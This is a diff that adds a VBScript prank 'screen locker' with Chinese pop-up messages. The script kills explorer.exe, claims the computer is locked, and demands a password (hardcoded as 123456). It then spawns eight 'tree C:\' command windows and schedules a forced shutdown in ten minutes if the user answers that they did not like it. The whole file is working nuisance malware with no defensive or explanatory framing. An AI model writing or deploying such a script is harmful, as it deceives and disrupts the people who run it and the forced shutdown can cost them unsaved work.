@@ -1,0 +1,33 @@
+Set obj = createobject("wscript.shell")
+obj.run "cmd /c taskkill /f /im explorer.exe"
+msgbox"你的电脑被我锁住了awa"
+dim a,b
+do
+a=inputbox("输入密码以解锁qwq")
+b="123456"
+if a=b then
+msgbox"哎呀，密码被你蒙对了"
+exit do
+else
+msgbox"密码错误qwq"
+end if
+loop
+msgbox"奖励时间到awa"
+Set obj = createobject("wscript.shell")
+obj.run "cmd /c tree C:\"
+obj.run "cmd /c tree C:\"
+obj.run "cmd /c tree C:\"
+obj.run "cmd /c tree C:\"
+obj.run "cmd /c tree C:\"
+obj.run "cmd /c tree C:\"
+obj.run "cmd /c tree C:\"
+obj.run "cmd /c tree C:\"
+if msgbox("是不是很不错",vbyesno)=vbyes then
+msgbox "谢谢你的夸奖"
+Set obj = createobject("wscript.shell")
+obj.run "cmd /c start explorer.exe"
+else
+msgbox "我生气了qwq"
+Set obj = createobject("wscript.shell")
+obj.run "cmd /c shutdown -s -t 600"
+end if
